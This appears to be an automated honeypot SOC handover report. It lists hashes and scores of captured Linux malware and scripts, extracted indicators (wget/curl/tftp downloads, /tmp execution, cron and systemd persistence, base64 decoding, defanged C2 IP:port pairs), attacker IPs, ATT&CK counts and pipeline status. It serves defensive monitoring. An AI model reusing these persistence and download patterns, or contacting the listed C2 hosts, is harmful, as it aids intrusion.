| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `130.12.180[.]32` | DE | Virtualine Technologies | **100** ⚠️ | 46 |
| `64.62.197[.]167` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `106.13.186[.]96` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 21 |
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `167.86.116[.]159` | FR | Contabo GmbH | **100** ⚠️ | 0 |
| `92.204.138[.]198` | US | Host Europe GmbH | **100** ⚠️ | 23 |
| `120.48.132[.]64` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 6 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `80.253.235[.]158` | RU | Sibirskie Seti Ltd. | **100** ⚠️ | 5 |
| `211.253.9[.]49` | KR | Korea Telecom | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 19 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 31 cases |
| Tool 34  | Credential Extractor        | ✅ 157 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (16.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 14 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-17T02:00:40Z_
